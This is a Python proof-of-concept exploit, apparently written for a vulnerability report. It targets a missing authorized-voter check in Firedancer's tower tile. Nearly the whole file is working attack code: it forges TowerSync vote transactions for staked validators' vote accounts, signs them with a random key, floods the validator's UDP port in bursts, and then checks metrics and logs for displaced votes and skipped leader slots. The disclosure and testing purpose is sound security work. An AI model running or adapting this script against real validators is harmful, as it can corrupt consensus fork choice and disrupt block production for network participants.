#!/usr/bin/env python3
"""
Pre-execution vote poisoning End-to-End PoC: Pre-Execution Vote Poisoning via Missing Authorized Voter Check

Demonstrates that Firedancer's tower tile (count_vote_txn) accepts TowerSync
vote transactions without verifying the signer is the authorized voter for the
referenced vote account. An attacker with any Ed25519 keypair can:

  1. Craft TowerSync transactions referencing staked validators' vote accounts
  2. Send them to Firedancer's TPU port (QUIC or UDP)
  3. FD's tower tile counts the fake votes with the victims' full stake
  4. Real votes for the same slots are rejected with ALREADY_VOTED

When enough stake is poisoned (>52%), fd_ghost_eqvoc marks honest blocks as
equivocating, corrupting fork choice and causing leader slot skipping.

Usage:
  # With cluster_info.json (written by setup_cluster.sh):
  python3 vote_poisoning_e2e.py --cluster-info /tmp/cons001/cluster_info.json

  # Manual:
  python3 vote_poisoning_e2e.py \\
    --rpc http://127.0.0.1:8899 \\
    --fd-tpu-host 127.0.0.1 --fd-tpu-port 9001 \\
    --target-vote-acc <VOTE_PUBKEY_1> --target-vote-acc <VOTE_PUBKEY_2> \\
    --fd-log /tmp/cons001/fd.log

Vulnerable code: src/discof/tower/fd_tower_tile.c:745-746
"""

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import urllib.request

from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.hash import Hash


# Vote111111111111111111111111111111111111111
VOTE_PROGRAM_ID = Pubkey.from_string("Vote111111111111111111111111111111111111111")


# ---------------------------------------------------------------------------
#  RPC helpers
# ---------------------------------------------------------------------------

def rpc_call(url, method, params=None):
    payload = json.dumps({
        "jsonrpc": "2.0", "id": 1,
        "method": method, "params": params or [],
    }).encode()
    req = urllib.request.Request(url, data=payload,
                                headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        result = json.loads(resp.read())
    if "error" in result:
        raise RuntimeError(f"RPC error: {result['error']}")
    return result["result"]


def get_slot(rpc):
    return rpc_call(rpc, "getSlot")


def get_blockhash(rpc):
    r = rpc_call(rpc, "getLatestBlockhash")
    return r["value"]["blockhash"]


def get_leader_schedule(rpc, slot=None):
    params = [{"commitment": "confirmed"}]
    if slot is not None:
        params[0]["slot"] = slot
    return rpc_call(rpc, "getLeaderSchedule", params)


def get_block_production(rpc):
    return rpc_call(rpc, "getBlockProduction")


# ---------------------------------------------------------------------------
#  Encoding helpers
# ---------------------------------------------------------------------------

def compact_u16(val):
    """Solana compact-u16 (short-vec length prefix)."""
    buf = bytearray()
    while True:
        b = val & 0x7F
        val >>= 7
        if val:
            buf.append(b | 0x80)
        else:
            buf.append(b)
            break
    return bytes(buf)


def leb128(val):
    """Unsigned LEB128 encoding (for lockout slot offsets)."""
    buf = bytearray()
    while val >= 0x80:
        buf.append((val & 0x7F) | 0x80)
        val >>= 7
    buf.append(val & 0x7F)
    return bytes(buf)


# ---------------------------------------------------------------------------
#  Transaction construction
# ---------------------------------------------------------------------------

def build_tower_sync_ix_data(root_slot, vote_slot, block_id_32):
    """Serialize a minimal TowerSync instruction body.

    Wire format (after 4-byte discriminator):
      u64 LE           root
      compact-u16      lockouts_cnt
      [lockout]*       (leb128 offset, u8 confirmation)
      32 bytes         bank_hash
      u8               timestamp_option
      i64 LE           timestamp (if option==1)
      32 bytes         block_id
    """
    d = bytearray()
    d += struct.pack('<I', 14)                    # discriminator: TowerSync
    d += struct.pack('<Q', root_slot)             # root
    d += compact_u16(1)                           # 1 lockout
    d += leb128(vote_slot - root_slot)            # slot offset from root
    d += struct.pack('B', 1)                      # confirmation_count = 1
    d += b'\x00' * 32                             # bank_hash (irrelevant)
    d += b'\x01'                                  # timestamp present
    d += struct.pack('<q', int(time.time()))       # timestamp
    d += block_id_32                              # block_id (attacker-chosen)
    return bytes(d)


def build_fake_vote_txn(attacker_kp, victim_vote_acc_bytes,
                        root_slot, vote_slot, block_id_32, blockhash_bytes):
    """Build a 1-sig legacy vote transaction.

    Account layout (same_addr path, 1 signature):
      [0] attacker_pubkey  - signer, writable  (fee payer + fake vote authority)
      [1] victim_vote_acc  - writable           (the staked vote account)
      [2] Vote program     - readonly

    Instruction: program_id=2, accounts=[1,0], data=TowerSync

    count_vote_txn extracts vote_acc = accs[1] (line 792) without checking
    that accs[0] is the authorized voter for that vote account.
    """
    ix_data = build_tower_sync_ix_data(root_slot, vote_slot, block_id_32)

    # -- Message --
    msg = bytearray()
    msg += bytes([1, 0, 1])                       # header: (sigs, ro_signed, ro_unsigned)
    msg += compact_u16(3)                          # 3 accounts
    msg += bytes(attacker_kp.pubkey())             # [0] attacker (signer)
    msg += victim_vote_acc_bytes                   # [1] victim vote account
    msg += bytes(VOTE_PROGRAM_ID)                  # [2] Vote program
    msg += blockhash_bytes                         # recent blockhash
    msg += compact_u16(1)                          # 1 instruction
    msg += bytes([2])                              # program_id index = 2
    msg += compact_u16(2)                          # 2 ix accounts
    msg += bytes([1, 0])                           # [vote_acc, authority]
    msg += compact_u16(len(ix_data))
    msg += ix_data
    msg_bytes = bytes(msg)

    # -- Sign --
    sig = attacker_kp.sign_message(msg_bytes)

    # -- Full transaction --
    txn = bytearray()
    txn += compact_u16(1)                          # 1 signature
    txn += bytes(sig)                              # 64-byte Ed25519 sig
    txn += msg_bytes
    return bytes(txn)


# ---------------------------------------------------------------------------
#  Attack logic
# ---------------------------------------------------------------------------

def send_attack_burst(sock, fd_addr, attacker_kp, targets,
                      root_slot, start_slot, num_slots,
                      block_id_32, blockhash_bytes):
    """Send one burst of fake votes covering num_slots for each target."""
    sent = 0
    for slot_off in range(1, num_slots + 1):
        vote_slot = start_slot + slot_off
        for target_bytes in targets:
            txn = build_fake_vote_txn(
                attacker_kp, target_bytes,
                root_slot, vote_slot, block_id_32, blockhash_bytes,
            )
            sock.sendto(txn, fd_addr)
            sent += 1
    return sent


def check_fd_metrics(fd_log_path, before_size=0):
    """Scan FD log for evidence of vote poisoning.

    Returns dict with counts of relevant log lines added since before_size.
    """
    evidence = {
        "already_voted": 0,
        "eqvoc": 0,
        "ghost_invalid": 0,
        "new_lines": [],
    }
    if not fd_log_path or not os.path.exists(fd_log_path):
        return evidence

    try:
        with open(fd_log_path, 'r', errors='replace') as f:
            f.seek(before_size)
            for line in f:
                ll = line.lower()
                if 'already_voted' in ll or 'already voted' in ll:
                    evidence["already_voted"] += 1
                    evidence["new_lines"].append(line.rstrip())
                if 'eqvoc' in ll:
                    evidence["eqvoc"] += 1
                    evidence["new_lines"].append(line.rstrip())
                if 'invalid' in ll and 'ghost' in ll:
                    evidence["ghost_invalid"] += 1
                    evidence["new_lines"].append(line.rstrip())
    except Exception as e:
        evidence["error"] = str(e)
    return evidence


def get_fd_metrics_prometheus(fd_host="127.0.0.1", fd_port=7999):
    """Try to scrape FD prometheus metrics for tower tile counters."""
    try:
        url = f"http://{fd_host}:{fd_port}/metrics"
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as resp:
            text = resp.read().decode()
        metrics = {}
        for line in text.split('\n'):
            if line.startswith('#'):
                continue
            # Look for tower/votes related metrics
            for key in ['votes_already_voted', 'txn_bad_tower',
                        'votes_unknown_vtr', 'tower_tile']:
                if key in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        metrics[parts[0]] = parts[1]
        return metrics
    except Exception:
        return {}


# ---------------------------------------------------------------------------
#  Main
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        description="Pre-execution vote poisoning E2E PoC: Vote Poisoning Attack")
    p.add_argument("--cluster-info",
                   help="Path to cluster_info.json from setup_cluster.sh")
    p.add_argument("--rpc", default="http://127.0.0.1:8899")
    p.add_argument("--fd-tpu-host", default="127.0.0.1")
    p.add_argument("--fd-tpu-port", type=int, default=9001)
    p.add_argument("--target-vote-acc", action="append", default=[])
    p.add_argument("--fd-log", default="")
    p.add_argument("--slots-ahead", type=int, default=128,
                   help="Number of future slots to poison per burst")
    p.add_argument("--burst-count", type=int, default=5,
                   help="Number of attack bursts to send")
    p.add_argument("--burst-interval", type=float, default=3.0,
                   help="Seconds between bursts")
    p.add_argument("--fd-identity", default="",
                   help="FD validator identity pubkey (for leader schedule)")
    args = p.parse_args()

    # Load cluster info if provided
    if args.cluster_info:
        with open(args.cluster_info) as f:
            info = json.load(f)
        if not args.target_vote_acc:
            args.target_vote_acc = [
                info["agave_vote_account"],
                info["dummy_vote_account"],
            ]
        args.rpc = info.get("rpc_url", args.rpc)
        args.fd_tpu_host = info.get("fd_tpu_host", args.fd_tpu_host)
        args.fd_tpu_port = info.get("fd_tpu_port", args.fd_tpu_port)
        args.fd_log = info.get("fd_log", args.fd_log)
        args.fd_identity = info.get("fd_identity", args.fd_identity)

    if not args.target_vote_acc:
        print("ERROR: No target vote accounts specified.", file=sys.stderr)
        print("Use --target-vote-acc or --cluster-info", file=sys.stderr)
        sys.exit(1)

    # -- Banner --
    print("=" * 60)
    print("  Pre-Execution Vote Poisoning - E2E PoC")
    print("=" * 60)
    print()

    # Generate attacker keypair (random, no stake, no identity)
    attacker = Keypair()
    print(f"[*] Attacker keypair: {attacker.pubkey()}")
    print(f"    (random key - no stake, no validator identity)")
    print()

    # Parse targets
    targets = [bytes(Pubkey.from_string(a)) for a in args.target_vote_acc]
    print(f"[*] Target vote accounts ({len(targets)}):")
    for acc in args.target_vote_acc:
        print(f"    {acc}")
    print()

    # Query cluster state
    print(f"[*] RPC: {args.rpc}")
    try:
        slot = get_slot(args.rpc)
    except Exception as e:
        print(f"ERROR: Cannot reach RPC: {e}", file=sys.stderr)
        sys.exit(1)
    blockhash = get_blockhash(args.rpc)
    bh_bytes = bytes(Hash.from_string(blockhash))
    print(f"    Current slot: {slot}")
    print(f"    Blockhash:    {blockhash}")
    print()

    # Show leader schedule for FD (if identity known)
    if args.fd_identity:
        print(f"[*] FD identity: {args.fd_identity}")
        try:
            schedule = get_leader_schedule(args.rpc)
            if schedule and args.fd_identity in schedule:
                fd_slots = schedule[args.fd_identity]
                upcoming = [s for s in fd_slots if s >= slot][:10]
                print(f"    FD upcoming leader slots: {upcoming}")
            else:
                print(f"    FD has no leader slots this epoch (or not in schedule)")
        except Exception as e:
            print(f"    Leader schedule query failed: {e}")
        print()

    # Record FD log position before attack
    log_size_before = 0
    if args.fd_log and os.path.exists(args.fd_log):
        log_size_before = os.path.getsize(args.fd_log)
        print(f"[*] FD log: {args.fd_log} ({log_size_before} bytes)")
    print()

    # Record baseline metrics
    print("[*] Baseline FD prometheus metrics:")
    baseline_metrics = get_fd_metrics_prometheus()
    if baseline_metrics:
        for k, v in sorted(baseline_metrics.items()):
            print(f"    {k} = {v}")
    else:
        print("    (prometheus not reachable - will check log instead)")
    print()

    # Prepare attack
    fake_block_id = b'\xDE\xAD\xBE\xEF' + b'\x00' * 28
    fd_addr = (args.fd_tpu_host, args.fd_tpu_port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("=" * 60)
    print("  ATTACK PHASE")
    print("=" * 60)
    print()
    print(f"[*] Sending {args.burst_count} bursts of fake TowerSync votes")
    print(f"    {args.slots_ahead} slots x {len(targets)} targets = "
          f"{args.slots_ahead * len(targets)} txns per burst")
    print(f"    Target: {args.fd_tpu_host}:{args.fd_tpu_port} (FD TPU UDP)")
    print(f"    Fake block_id: {fake_block_id[:4].hex()}...")
    print()

    total_sent = 0
    for burst_idx in range(args.burst_count):
        # Refresh slot and blockhash each burst
        try:
            slot = get_slot(args.rpc)
            blockhash = get_blockhash(args.rpc)
            bh_bytes = bytes(Hash.from_string(blockhash))
        except Exception:
            pass  # use previous values

        root_slot = max(0, slot - 5)

        n = send_attack_burst(
            sock, fd_addr, attacker, targets,
            root_slot, slot, args.slots_ahead,
            fake_block_id, bh_bytes,
        )
        total_sent += n
        print(f"    Burst {burst_idx+1}/{args.burst_count}: "
              f"sent {n} txns (slots {slot+1}..{slot+args.slots_ahead}), "
              f"root={root_slot}")

        if burst_idx < args.burst_count - 1:
            time.sleep(args.burst_interval)

    sock.close()
    print(f"\n[*] Total fake votes sent: {total_sent}")

    # Wait for FD to process
    print(f"\n[*] Waiting 10 seconds for FD to process transactions...")
    time.sleep(10)

    # -- Evidence collection --
    print()
    print("=" * 60)
    print("  EVIDENCE COLLECTION")
    print("=" * 60)
    print()

    # 1. Check FD prometheus metrics
    print("[*] Post-attack FD prometheus metrics:")
    post_metrics = get_fd_metrics_prometheus()
    if post_metrics:
        for k, v in sorted(post_metrics.items()):
            baseline_v = baseline_metrics.get(k, "0")
            delta = ""
            try:
                d = float(v) - float(baseline_v)
                if d > 0:
                    delta = f" (+{d:.0f})"
            except ValueError:
                pass
            print(f"    {k} = {v}{delta}")
    else:
        print("    (prometheus not reachable)")
    print()

    # 2. Check FD log for evidence
    print("[*] Scanning FD log for attack evidence...")
    evidence = check_fd_metrics(args.fd_log, log_size_before)
    print(f"    votes_already_voted events: {evidence['already_voted']}")
    print(f"    equivocation events:        {evidence['eqvoc']}")
    print(f"    ghost_invalid events:       {evidence['ghost_invalid']}")
    if evidence["new_lines"]:
        print(f"\n    Relevant log lines (first 20):")
        for line in evidence["new_lines"][:20]:
            print(f"      {line}")
    print()

    # 3. Try firedancer-dev metrics command
    print("[*] Checking FD metrics via CLI...")
    try:
        out = subprocess.run(
            ["/home/user/firedancer/build/native/gcc/bin/firedancer-dev",
             "metrics", "--config", "/tmp/cons001/fd-config.toml"],
            capture_output=True, text=True, timeout=10,
        )
        for line in out.stdout.split('\n'):
            if any(k in line.lower() for k in
                   ['already_voted', 'tower', 'eqvoc', 'vote']):
                print(f"    {line}")
    except Exception as e:
        print(f"    (metrics CLI failed: {e})")
    print()

    # 4. Check cluster health
    print("[*] Post-attack cluster state:")
    try:
        new_slot = get_slot(args.rpc)
        print(f"    Current slot: {new_slot} (advanced {new_slot - slot} since attack start)")
    except Exception as e:
        print(f"    RPC error: {e}")

    # 5. Check block production for FD
    if args.fd_identity:
        print(f"\n[*] Block production for FD ({args.fd_identity[:16]}...):")
        try:
            bp = get_block_production(args.rpc)
            if bp and "value" in bp:
                by_id = bp["value"].get("byIdentity", {})
                fd_prod = by_id.get(args.fd_identity, [0, 0])
                agave_id = args.target_vote_acc[0] if args.target_vote_acc else ""
                # Look for Agave identity in the cluster info
                if args.cluster_info:
                    with open(args.cluster_info) as f:
                        ci = json.load(f)
                    agave_id_key = ci.get("agave_identity", "")
                    agave_prod = by_id.get(agave_id_key, [0, 0])
                    print(f"    Agave: {agave_prod[0]} leader slots, "
                          f"{agave_prod[1]} blocks produced")
                print(f"    FD:    {fd_prod[0]} leader slots, "
                      f"{fd_prod[1]} blocks produced")
                if fd_prod[0] > 0:
                    skip_rate = 1.0 - (fd_prod[1] / fd_prod[0]) if fd_prod[0] else 0
                    print(f"    FD skip rate: {skip_rate*100:.1f}%")
        except Exception as e:
            print(f"    Block production query failed: {e}")
    print()

    # -- Summary --
    print("=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    print()
    print(f"Fake votes sent:      {total_sent}")
    print(f"Targets:              {len(targets)} vote accounts (67% of stake)")
    print(f"Attacker identity:    {attacker.pubkey()}")
    print(f"Attacker stake:       0 SOL (no stake required)")
    print(f"Attacker fees paid:   0 SOL (UDP TPU, no fee)")
    print()
    print("The attack exploits the missing authorized voter check in")
    print("count_vote_txn (src/discof/tower/fd_tower_tile.c:745-746).")
    print("Fake votes are counted with the victim's full stake toward")
    print("an attacker-chosen block_id, and real votes for the same")
    print("slots are permanently rejected with ALREADY_VOTED.")
    print()

    # Determine outcome from prometheus metrics (primary evidence source)
    prom_already = 0
    prom_unknown_bid = 0
    for k, v in post_metrics.items():
        if 'already_voted' in k:
            base = float(baseline_metrics.get(k, 0))
            prom_already = int(float(v) - base)
        if 'unknown_block_id' in k:
            base = float(baseline_metrics.get(k, 0))
            prom_unknown_bid = int(float(v) - base)

    if prom_already > 0 or prom_unknown_bid > 0:
        print("[!] VULNERABILITY CONFIRMED via prometheus metrics:")
        if prom_unknown_bid > 0:
            print(f"    {prom_unknown_bid} fake votes ACCEPTED by count_vote_txn")
            print("    (tower_votes_unknown_block_id increased - attacker's")
            print("     fabricated block_id was counted with victims' stake)")
        if prom_already > 0:
            print(f"    {prom_already} real votes REJECTED with ALREADY_VOTED")
            print("    (tower_votes_already_voted increased - legitimate votes")
            print("     permanently displaced by attacker's preemptive fakes)")
        print()
        print("    This proves count_vote_txn does not verify the authorized")
        print("    voter, allowing any Ed25519 key to cast votes on behalf of")
        print("    staked validators in FD's pre-execution fork choice tracking.")
    elif evidence["eqvoc"] > 0 or evidence["ghost_invalid"] > 0:
        print("[!] GHOST TREE INVALIDATION DETECTED in FD logs")
    elif evidence["already_voted"] > 0:
        print("[!] VOTE DISPLACEMENT CONFIRMED in FD logs")
    else:
        print("[?] No direct evidence found.")
        print("    Check FD prometheus metrics manually:")
        print("    firedancer-dev metrics --config /tmp/fd-localnet.toml | grep tower_votes")


if __name__ == "__main__":
    main()
